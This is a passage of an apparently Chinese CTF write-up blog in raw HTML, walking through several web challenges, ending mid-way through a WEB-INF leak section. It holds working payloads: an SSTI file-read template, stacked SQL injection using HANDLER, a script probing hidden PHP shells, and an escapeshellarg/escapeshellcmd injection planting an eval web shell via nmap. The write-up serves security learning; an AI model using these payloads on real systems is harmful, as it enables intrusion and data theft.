src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308105652.png\"></p>\n<p>根据地址访问图片马的地址，使用system读文件还没成，用蚁剑连了执行执行ret=127,disable_function了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110126.png\"></p>\n<p>不过根目录下的flag文件还是可以正常读取，至于disable_function可以参考<a href=\"https://braindance.tk/2020/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/\">【极客大挑战 2019】RCE ME</a>。</p>\n<hr>\n<h1 id=\"BJDCTF-2nd-fake-google\"><a href=\"#BJDCTF-2nd-fake-google\" class=\"headerlink\" title=\"[BJDCTF 2nd]fake google\"></a>[BJDCTF 2nd]fake google</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110510.png\"></p>\n<p>就一个输入框，随便输入一个去看看，跳转以后</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110545.png\"></p>\n<p>注释里有提示ssti，应该是模板注入，就在网上搜一个ssti的payload试试<a href=\"https://blog.csdn.net/qq_40657585/article/details/83657220\">SSTI (服务器模板注入)</a></p>\n<p>找到了一个直接读文件的payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110717.png\"></p>\n<hr>\n<h1 id=\"GYCTF2020-Blacklist\"><a href=\"#GYCTF2020-Blacklist\" class=\"headerlink\" title=\"[GYCTF2020]Blacklist\"></a>[GYCTF2020]Blacklist</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308110821.png\"></p>\n<p>sql注入，先试一试堆叠注入，可以执行，尝试select的时候返回了过滤内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> preg_match(<span class=\"string\">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\\./i&quot;</span>,<span class=\"variable\">$inject</span>);</span><br></pre></td></tr></table></figure>\n\n<p>前面还有一个堆叠注入的是新姿势**[强网杯 2019]随便注**，一种是使用prepare预处理语句，另一种是修改表名，根据上面的过滤内容，两种方法都被过滤了。先试试查看表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;show tables;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">FlagHere</span></span><br><span class=\"line\"><span class=\"string\">words</span></span><br></pre></td></tr></table></figure>\n\n<p>查看表结构：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;desc `FlagHere`;</span></span><br></pre></td></tr></table></figure>\n\n<p>接下来是看的wp，学到了个新姿势：使用<code>HANDLER ... OPEN</code>语句，贴一个<a href=\"https://dev.mysql.com/doc/refman/8.0/en/handler.html\">官方文档</a>。</p>\n<p><code>HANDLER ... OPEN</code>语句打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句访问，该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">-1</span><span class=\"string\">&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308111414.png\"></p>\n<hr>\n<h1 id=\"强网杯-2019-高明的黑客\"><a href=\"#强网杯-2019-高明的黑客\" class=\"headerlink\" title=\"[强网杯 2019]高明的黑客\"></a>[强网杯 2019]高明的黑客</h1><p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210308112326.png\"></p>\n<p>下载源码以后一堆不可读的源码，但是里面有很多shell，看不懂所以找了wp，思路就是用脚本匹配文件中的shell，然后传参试一试每一个shell是否能用，抄脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># codeing = utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span>  requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">requests.adapters.DEFAULT_RETRIES = <span class=\"number\">8</span></span><br><span class=\"line\">session = requests.session()</span><br><span class=\"line\">session.keep_alive = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">sem=threading.Semaphore(<span class=\"number\">30</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://84fa677d-e4dd-47a1-9124-1823cc996d12.node3.buuoj.cn/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;D:\\DROPS\\phpstudy_pro\\WWW\\ctf\\src\\\\&quot;</span></span><br><span class=\"line\">fileNames = os.listdir(path)</span><br><span class=\"line\"></span><br><span class=\"line\">rrGET = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;\\$_GET\\[\\&#x27;(\\w+)\\&#x27;\\]&quot;</span>)</span><br><span class=\"line\">rrPOST = re.<span class=\"built_in\">compile</span>(<span class=\"string\">r&quot;\\$_POST\\[\\&#x27;(\\w+)\\&#x27;\\]&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">local_file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;flag.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>,encoding=<span class=\"string\">&quot;utf-8&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">fileName</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> sem:</span><br><span class=\"line\">        file = <span class=\"built_in\">open</span>(path+fileName,<span class=\"string\">&#x27;r&#x27;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">        content = file.read()</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[+]checking: %s&quot;</span>%fileName)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#GET</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> rrGET.findall(content):</span><br><span class=\"line\">            r = session.get(url+<span class=\"string\">&quot;%s?%s=%s&quot;</span>%(fileName,i,<span class=\"string\">&quot;echo ~guobanghhh~&quot;</span>))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;~guobanghhh~&quot;</span> <span class=\"keyword\">in</span> r.text:</span><br><span class=\"line\">                flag = fileName + <span class=\"string\">&quot;中的&quot;</span> + i + <span class=\"string\">&quot;可以用！！！&quot;</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">                local_file.write(flag)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#POST</span></span><br><span class=\"line\">        <span class=\"comment\"># for i in rrPOST.findall(content):</span></span><br><span class=\"line\">        <span class=\"comment\">#     r = session.post(url+fileName,data=&#123;i:&quot;echo ~guobanghhh~&quot;&#125;)</span></span><br><span class=\"line\">        <span class=\"comment\">#     if &quot;~guobanghhh~&quot; in r.text:</span></span><br><span class=\"line\">        <span class=\"comment\">#         flag = fileName + &quot;中的&quot; + i + &quot;可以用！！！&quot;</span></span><br><span class=\"line\">        <span class=\"comment\">#         print(flag)</span></span><br><span class=\"line\">        <span class=\"comment\">#         local_file.write(flag)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    run(<span class=\"string\">&quot;xk0SzyKwfzw.php&quot;</span>)</span><br><span class=\"line\">    start_time = time.time()  <span class=\"comment\"># 开始时间</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;[start]程序开始:&quot;</span> + <span class=\"built_in\">str</span>(start_time))</span><br><span class=\"line\">    thread_list = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> fileName <span class=\"keyword\">in</span> fileNames:</span><br><span class=\"line\">        t = threading.Thread(target=run,args=(fileName,))</span><br><span class=\"line\">        thread_list.append(t)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread_list:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> thread_list:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果就是访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://dd1c66d5-66b2-4b82-a2a8-bf7bfbecdd97.node3.buuoj.cn/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag</span><br></pre></td></tr></table></figure>\n\n<p>获得flag</p>\n<hr>\n<h1 id=\"MRCTF2020-Ez-bypass\"><a href=\"#MRCTF2020-Ez-bypass\" class=\"headerlink\" title=\"[MRCTF2020]Ez_bypass\"></a>[MRCTF2020]Ez_bypass</h1><p>不截图了，主页没有代码格式，贴一个源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">I put something in F12 <span class=\"keyword\">for</span> you</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$flag</span>=<span class=\"string\">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;gg&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$id</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;id&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$gg</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;gg&#x27;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (md5(<span class=\"variable\">$id</span>) === md5(<span class=\"variable\">$gg</span>) &amp;&amp; <span class=\"variable\">$id</span> !== <span class=\"variable\">$gg</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You got the first step&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$passwd</span>=<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;passwd&#x27;</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!is_numeric(<span class=\"variable\">$passwd</span>))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span>(<span class=\"variable\">$passwd</span>==<span class=\"number\">1234567</span>)</span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">                     <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;Good Job!&#x27;</span>;</span><br><span class=\"line\">                     highlight_file(<span class=\"string\">&#x27;flag.php&#x27;</span>);</span><br><span class=\"line\">                     <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;By Retr_0&#x27;</span>);</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">                 <span class=\"keyword\">else</span></span><br><span class=\"line\">                 &#123;</span><br><span class=\"line\">                     <span class=\"keyword\">echo</span> <span class=\"string\">&quot;can you think twice??&quot;</span>;</span><br><span class=\"line\">                 &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;You can not get it !&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You are not a real hacker!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Please input first&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;Please input first</span><br></pre></td></tr></table></figure>\n\n<p>分析一波：</p>\n<ul>\n<li>第7行是第一层需要md5的值相同但是两个变量不同，需要注意是强比较<code>===</code>噢。</li>\n<li>第11、17行判断passwd是非数字并且若比较<code>==</code>等于1234567</li>\n</ul>\n<p>第一个利用数组即可绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">md5([1,2,3]) == md5([4,5,6]) == NULL</span><br></pre></td></tr></table></figure>\n\n<p>第二个利用比较时会进行类型转换，字符串<code>1234567a</code>会被强制转换类型为整型的<code>1234567</code></p>\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id[]=1&amp;gg[]=2</span><br><span class=\"line\"></span><br><span class=\"line\">POST</span><br><span class=\"line\">passwd=1234567a</span><br></pre></td></tr></table></figure>\n\n\n\n<hr>\n<h1 id=\"BUUCTF-2018-Online-Tool\"><a href=\"#BUUCTF-2018-Online-Tool\" class=\"headerlink\" title=\"[BUUCTF 2018]Online Tool\"></a>[BUUCTF 2018]Online Tool</h1><p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] = <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;host&#x27;</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;host&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = escapeshellarg(<span class=\"variable\">$host</span>);</span><br><span class=\"line\">    <span class=\"variable\">$host</span> = escapeshellcmd(<span class=\"variable\">$host</span>);</span><br><span class=\"line\">    <span class=\"variable\">$sandbox</span> = md5(<span class=\"string\">&quot;glzjin&quot;</span>. <span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;you are in sandbox &#x27;</span>.<span class=\"variable\">$sandbox</span>;</span><br><span class=\"line\">    @mkdir(<span class=\"variable\">$sandbox</span>);</span><br><span class=\"line\">    chdir(<span class=\"variable\">$sandbox</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> system(<span class=\"string\">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class=\"variable\">$host</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>最后有一个system函数，但是使用的nmap的指令，经过一番搜索得知了nmap可以把结果存储在文件里，所以这道题也是道RCE。还有两个没见过的函数<code>escapeshellarg</code>、<code>escapeshellcmd</code>。</p>\n<p>这道题利用了两个点</p>\n<ol>\n<li><p>nmap可以将扫描的结果存储在文件里。使用方法：<a href=\"https://blog.csdn.net/weixin_34221036/article/details/92148628\">Nmap扫描结果的保存和输出</a></p>\n</li>\n<li><p>escapeshellarg+escapeshellcmd同时使用有一些漏洞</p>\n<blockquote>\n<p><a href=\"http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/\">谈谈escapeshellarg参数绕过和注入的问题</a></p>\n<p><a href=\"https://paper.seebug.org/164/\">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>\n</blockquote>\n</li>\n</ol>\n<p>参考博客整理一下这两个处理命令的函数同时使用时的问题：</p>\n<ol>\n<li>假如传入的参数为<code>172.17.0.2&#39; -v -d a=1</code></li>\n<li>首先经过<code>escapeshellarg</code>函数，这个函数会把单独的单引号<code>&#39;</code>加上转义符<code>\\</code>并使用单引号<code>&#39;</code>括起来，再使用单引号<code>&#39;</code>把整个参数括起来。这时候的参数是<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1&#39;</code></li>\n<li>再进入<code>escapeshellcmd</code>函数，这个函数（从左至右会把落单的符号直接加转义符，其他什么都不做）遇到成对匹配的单引号<code>&#39;</code>不过处理，转义符<code>\\</code>再使用转义符转义，再略过一个成对的单引号<code>&#39;&#39;</code>，最后一个单引号<code>&#39;</code>再使用转义符转义。这时候的参数就成了<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code></li>\n<li>最后执行的参数是<code>&#39;172.17.0.2&#39;\\\\&#39;&#39; -v -d a=1\\&#39;</code>，由于中间的<code>\\\\</code>被解释为<code>\\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白符。所以可以简化为<code> 172.17.0.2\\ -v -d a=1&#39;</code></li>\n</ol>\n<p>所以构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>\n\n<p>经过<code>escapeshellarg</code>函数会被解析成为：<code>&#39;&#39;\\&#39;&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;\\&#39;&#39;&#39;</code></p>\n<p>再经过<code>escapeshellcmd</code>函数会被解析为：<code>&#39;&#39;\\\\&#39;&#39;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#39;\\\\&#39;&#39;&#39;</code></p>\n<p>注意最后单引号前面的那个空格很重要，如果是紧挨着的话文件名称就成了<code>1.php\\</code>不在是php文件了。所以我们的payload最终在服务器端是：<code>\\&lt;?php eval($_POST[_]) ?&gt; -oG 1.php \\ </code>。</p>\n<p>加空格目的是为了防止文件名后缀中出现符号，加上空格就会舍去。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$host</span> = <span class=\"string\">&quot;&#x27;&lt;?php eval(<span class=\"subst\">$_POST</span>[_]) ?&gt; -oG 1.php &#x27;&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$host</span> = escapeshellarg(<span class=\"variable\">$host</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$host</span> = escapeshellcmd(<span class=\"variable\">$host</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$host</span>.<span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;&lt;?php eval() ?&gt; -oG 1.php &#x27;</span><br><span class=\"line\">&#x27;&#x27;\\&#x27;&#x27;&lt;?php eval() ?&gt; -oG 1.php &#x27;\\&#x27;&#x27;&#x27;</span><br><span class=\"line\">&#x27;&#x27;\\\\&#x27;&#x27;\\&lt;\\?php eval\\(\\) \\?\\&gt; -oG 1.php &#x27;\\\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>最终请求payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?host=&#x27;&lt;?php eval($_POST[_]) ?&gt; -oG 1.php &#x27;</span><br></pre></td></tr></table></figure>\n\n<p>执行指令时会创建一个sandbox文件夹，访问<code>$sandbox$/1.php</code>，POST传参</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110615.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110726.png\"></p>\n<hr>\n<h1 id=\"RoarCTF-2019-Easy-Java\"><a href=\"#RoarCTF-2019-Easy-Java\" class=\"headerlink\" title=\"[RoarCTF 2019]Easy Java\"></a>[RoarCTF 2019]Easy Java</h1><p>是java写的web程序</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110821.png\"></p>\n<p>考点是<strong>WEB-INF/web.xml泄露</strong></p>\n<blockquote>\n<p>WEB-INF主要包含一下文件或目录: </p>\n<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>\n<p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </p>\n<p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 </p>\n<p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 </p>\n<p>/WEB-INF/database.properties：数据库配置文件 </p>\n<p>漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</p>\n</blockquote>\n<p>重点不在登陆界面，而是那个Help按钮，可以下载文件。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20210310110934.png\"></p>\n<p>首先尝试去读web.xml文档，添加POST请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">filename=WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n<p>可以读取web.xml文件：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span 